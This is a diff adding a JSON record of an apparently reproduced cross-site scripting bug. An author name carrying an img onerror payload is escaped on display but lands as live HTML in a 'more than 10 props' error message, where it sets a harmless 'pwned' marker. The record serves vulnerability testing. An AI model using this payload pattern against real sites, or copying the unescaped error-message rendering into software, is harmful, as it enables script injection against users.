@@ -1,0 +1,20 @@
+{
+  "reproduced": "yes",
+  "registryHits": 4,
+  "payload": "Scott <img src=x onerror=\"document.documentElement.dataset.pwned='sassyreg'\">",
+  "before": {
+    "authorText": "Scott <img src=x onerror=\"document.documentElement.dataset.pwned='sassyreg'\">",
+    "authorHtml": "Scott &lt;img src=x onerror=\"document.documentElement.dataset.pwned='sassyreg'\"&gt;",
+    "pwned": null,
+    "imgCount": 0
+  },
+  "after": {
+    "pwned": "sassyreg",
+    "propsText": true,
+    "errorHtml": "\n            <div class=\"text-center\">\n            <h4>\n                <p class=\"text-danger\">\n                        <br>\n                    We appreciate your kindness for <i><strong>Scott <img src=\"x\" onerror=\"document.documentElement.dataset.pwned='sassyreg'\"></strong></i>, but\n                        <br>\n                    you can't provide more than 10 props for each maintainer\n                </p>\n            </h4>\n            </div>\n            ",
+    "imgCount": 1,
+    "imgOnerror": "document.documentElement.dataset.pwned='sassyreg'"
+  },
+  "pageErrors": [],
+  "consoleLines": []
+}
